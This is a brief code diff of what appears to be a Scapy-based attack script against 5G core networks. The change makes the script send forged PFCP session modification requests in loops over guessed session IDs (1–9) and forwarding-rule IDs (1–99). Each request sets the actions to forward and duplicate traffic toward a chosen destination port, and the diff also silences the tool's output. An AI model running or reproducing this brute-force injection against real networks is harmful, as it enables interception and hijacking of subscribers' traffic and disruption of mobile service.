@@ -180,6 +180,7 @@ modif_req = Build_PFCP_session_modification_req(
     apply_action=["FORW", "DUPL"]
     )
 
+conf.verb = 0
 for seid in range(1,10):
     for farid in range(1,100):
         modif_req = Build_PFCP_session_modification_req(
@@ -191,8 +192,8 @@ for seid in range(1,10):
             dest_port=DEST_PORT,
             apply_action=["FORW", "DUPL"]
         )
+        send(modif_req)
        
     
 
 
-send(modif_req)
